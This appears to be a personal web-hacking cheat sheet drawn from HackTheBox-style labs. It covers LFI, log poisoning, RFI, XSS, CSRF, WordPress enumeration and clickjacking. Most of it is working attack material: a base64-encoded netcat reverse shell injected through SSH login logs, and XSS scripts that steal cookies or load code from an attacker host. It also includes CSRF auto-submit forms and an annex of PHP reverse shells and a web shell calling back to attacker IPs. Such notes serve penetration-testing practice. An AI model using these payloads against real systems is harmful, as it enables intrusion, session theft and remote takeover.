# Web hacking labs

This is a compilation of the web hacking techniques I could recopilate trying separate it in each category or from what hackthebox machine I was able to get it!

Hope you enjoy!

Generic process:
```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -u http://10.10.10.88 -o gobuster/port80root.txt

feroxbuster -u http://10.10.10.88 -x php -B -n
```


The different attacks we're going to deploy here and define a methodology are:
- Local File Inclusion
- Wrappers
- Log Poisoning
- Remote File Inclusion
- HTML Injection
- Cross-Site Scripting (XSS)
- Blind Cross-Site Scripting (XSS Blind)?
- Cross-Site Request Forgery (CSRF)
- Server-Side Request Forgery (SSRF)
- SQLi - Error based
- SQLi - Time based
- Padding Oracle Attack (Padbuster)
- Padding Oracle Attack (Bit Flipper Attack with Burpsuite)
- ShellShock
- XML External Entity Injection (XXE)
- Blind XXE
- Domain Zone Transfer
- Insecure Deserialization
- Type Juggling


-----------------------

Other I plan to add:
- IDOR
- Magic Numbers
- IDN homographic attack



## Local File Inclusion
**PoC**
```bash
#run apache service
sudo service apache2 start
#check the port 80 busy
lsof -i:80

#Create a php app
cd /var/www/html
nano example.php
```
```text
<?php
	$filename = $_GET['file']; # ?file=example.php
	include($filename);# to include a particular path include("/var/www/html/" . $filename), but you can bypass with ../../../.....
?>
```


Right now you can exploit the LFI in your local machine with: `localhost/example.php?file=/etc/passwd`

What can we do exploit with this?:
- Enum users (/etc/passwd)
- Extract ssh keys (~/.ssh/id_rsa)
- Log Poisoning
- Enumerate /proc/ information
	- Enumerate process and IP interfaces (/proc/sched_debug)
	- Enumerate IP interfaces (/proc/net/fib_trie)
	- Enumerate open ports (/proc/net/tcp)
	```
	for port in $(curl -s "http://localhost/example.php?file=/proc/net/tcp" | awk '{print $2}' | grep -v local_address | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> Puerto $(echo "ibase=16; $port" | bc)"; done
	```
	And if you can't use bc other way to conver hexadecimal to decimal in bash is:
	```
	for port in $(cat /proc/net/tcp | awk '{print $2}' | grep -v local_address | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> Puerto $(printf $port=%d\n)" $((16#$port)); done
	```
#### Bypassing restriction for LFI
[Still not developed]
**Null Byte injection**
Code example:
```php
<?php
	$filename = $_GET['file'];
	include("/var/www/html" . $filename ".randomextension");
?>
```
You could avoid the extension reading adding a null byte injectio
../../../../etc/passwd%00

**PHP Wrappers**
You can try bypass some LFI restirctions using the Wrappers:&
- `http://localhost/example.php?file=file://../../../../etc/passwd`
- `http://localhost/example.php?file=php://filter/convert.base64-encode/resource=/../../../../etc/passwd`
- 


## Log Poisoning
To convert a LFI in RCE we can use the logs files:
```
#check the apache logs
http://localhost/example.php?file=/var/log/apache2/access.log
#ssh login tries
http://localhost/example.php?file=/var/log/auth.log
##to exploit this you can try to use a reverse shell command as a user but code it in base64
echo "nc -e /bin/bash ip_kali 443" | base64
>bmMgLWUgL2Jpbi9iYXNoIGlwX2thbGkgNDQzCg==
###login in the ssh service
ssh '<?php system("echo bmMgLWUgL2Jpbi9iYXNoIGlwX2thbGkgNDQzCg== | base64 -d | bash"); ?>'
```
We can modify the user-agent to execute php code when we access it using the LFI vulenrability
```
curl -s -H "User-Agent: <?php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/apache2/access.log"
```

## Remote File Inclusion - RFI
You can create a malicious php in your local machine and make the remote server download and execute this file.
To exploit this and get a reverse shell you need three tabs opened and execute in the next order:
```
curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://$malicious_IP/maliciousfile.php
```


## XSS
An XSS can take control of a remote browser of a victim. We could from delete a specific content to the user to create a new administrator account if the user have enough privileges.
Other attack vector could be:
- Phising with a fake login page
- Defacement attacks
- DDoS
- XSS Worm that is propagate from web to web or even from user to user in a same web page.
- Log out the user session
- Delete some content of from the web
- Create an keylogger
- AJAX Request to obtain a session token
	```
	<script>
		d = "&to=eviluser&enviar=Enviar&mensaje=Mi cookie es: "+document.cookie;
		if(window.XMLHttpRequest)
		{
		x=new XMLHttpRequest();
		}
		else
		{
		x=new ActiveXObject('Microsoft.XMLHTTP');
		}
		x.open("POST","func/send.php",true);
		x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
		x.setRequestHeader('Content-Length',d.length);
		x.send(d);
	</script>
	```

If you discover some input where you can add html code you can try inject javascript code with:
```
<scrip>alert("testing XSS");</script>
<script>alert(document.cookie)</script>

#### Open an http server in your malicious machine (python3 -m http.server)
<script>document.write('<img src="http://127.0.0.1:8000/daffi.png?cookie=' + document.cookie + '">')</script>

### inside a value tag
<input type="text" name="q2 value="[MyText]" />
#### for example
"/><script>alert("¡Hola Mundo!");</script><div class="

### Inside a comment
<!-- La busqueda fue "[busqueda]" -->
--><script>alert("¡Hola Mundo");</script><!-

### Code copied inside javascript tags
<script> var busqueda = "[MyText]"; </script>
#### just you need use something like
";alert("¡Hola Mundo!");//
```

To Change the cookie in your own browser you can use de plugin "EditThisCookie"


To check if XSS is a possible attack vector you have to check if in some input you can add:
```text
`
'
<
>
/
[Space]
script
onload
javascript
```

**Using AJAX requests**
- AJAX Request to obtain a session token
        ```
        <script>
                d = "&to=eviluser&enviar=Enviar&mensaje=Mi cookie es: "+document.cookie;
                if(window.XMLHttpRequest)
                {
                x=new XMLHttpRequest();
                }
                else
                {
                x=new ActiveXObject('Microsoft.XMLHTTP');
                }
                x.open("POST","func/send.php",true);
                x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
                x.setRequestHeader('Content-Length',d.length);
                x.send(d);
        </script>
        ```
The `x.open("POST","func/send.php",true);` create the POST request and with the true we indicate that the request is going to be asynchronous, that means that the browser is not going to get freeze until get the answer.
The `x.setRequestHeader` is useful to create a more sharp request indicating the headers to use

#### XSS Filters
Is common that some characters or expressions are banned in the server-side. How can we bypass it?
**String.fromCharCode() function**
A function in javascript that can be usefull to bypass quotes restrictions and introduce strings
Copy the next in the javascript console as example:
```
String.fromCharCode(72, 111, 108, 97, 32, 77, 117, 110, 100, 111, 33)
```

How can we convert a text in ASCII character to 

**Use a external file**
```
<script src=http://www.atacante.com/xss.js></script>
```

**Limit in the number of character**
In case we have several inputs we could try to combined these to add more content. For that you can just comment everything in the middle between bout contents. For example:
```
Input1: <scrip/*
Input2: */>alert(1)</script>
```

Or in case we want add a file.js we can attach an url using tinyurl.com or is.gd to reduce the lenght.
`<script src=http://is.gd/owYT></script>`

**Limit in < > or "script"**
For this we have to try create an event inside the tag we're in!
```
<input type="text" name="búsqueda" value=""
OnFocus="alert('Hola Mundo!');" />
```

## CSRF
Where is the risk for this?

The risk can be come from two different vectors:
1. Use a GET request to make a user autheticate in a particular site do some unconcious action without his concern. For example change a password:
```
http://10.10.10.97/change_pass.php?password=hola123&confirm_pass=hola123&submit=submit
```
We could this way force change the user password.

So if we found some critical POST request we should try use a GET to exploit this!

We could use shorturl.at to disguise the suspitions in this case.

2. To exploit a POST request the idea is server a web application that automatically send a POST request to apply the action:
```html
<form method="POST" action="https://ac7f1fed1e92653dc0e3b231003200d4.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="prueba&#64;mail&#46;com">
</form>
<script>
      document.forms[0].submit();
</script> 
```
This way if we make the user go in we will force him to send the POST request with the information we want.

Is common exploit this using an img tag (or in a malicious web or directly injected with HTML injection!
```
<img src="http://www.sitio001.com/comprar.asp?idObjeto=31173
&confirm=yes" onerror="this.src="logo.jpg";this.onerror=null;"/>
```
You could use CSS to avoid see the not found image to be more professional.

The only way to protect from CSRF is define some numeric value unique for each request in a catpcha way for example, that the user have to put it to do critical actions.

Some good practices we should do are:
- Close session of a web after finish our activity on it
- Not remember credentials in the browser
- Use different browser for fun and for bussiness

--------------------------------------
## CMR
#### Wordpress
If you detect and wordpress site first thing you should do is locate plugins in that:
```
wpscan -u http://10.10.10.88/webservice/wp/ --enumerate p,t,u | tee wpscan.log

##with wfuzz
###locate *plugin* -> /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
wfuzz -c -hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
```

###### Wordpress Database Structure
https://blogvault.net/wordpress-database-schema/


## Clickjacking
Consist in use iframes object to superpose the content of 3rd that the user to made him click in a place.

https://github.com/clarkio/clickjacking

For example when you click a player buttom and you are doing a like to a some facebook publication without your concern. For that you should put the iframe in the front and made it invisible (transparent) using CSS.

Another variation is duplicate your mouse cursor and fix a distance from the original and then hide the originl one, then we could made him click in unsafe elements without his concern.


To mitigate this use:
- Framekiller JS to prevent that a web were displayed in a frame object.
```
#implementation
<style>html{display:none;}</style>
<script>
   if (self == top) {
       document.documentElement.style.display = 'block'; 
   } else {
       top.location = self.location; 
   }
</script>
```
- Content Policy headers could be useful How? Investigate...
- X-Frame-Options header can restrict which origin can embed a specific page. This is the most recommended way. Just setting as Deny or SAMEORIGIN will prevent that your webpage were embed in another using a frame object.

--------------------------------------
# Anex A
PHP functions to execute with php:
- system
- exec
- passthru
- shell_exec


https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/

## basic php reverse shells
```
<?php
        exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/4321 0>&1'");
?>

<?php
  system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'");
?>

<?php
        system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4321 >/tmp/f');
?> 

<?php
    echo "<pre>" . shell.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4321 >/tmp/f') . "</pre>";
?>
```

## Basic php web-shell
```
<?php
	system($_REQUEST['cmd']);
?>


```
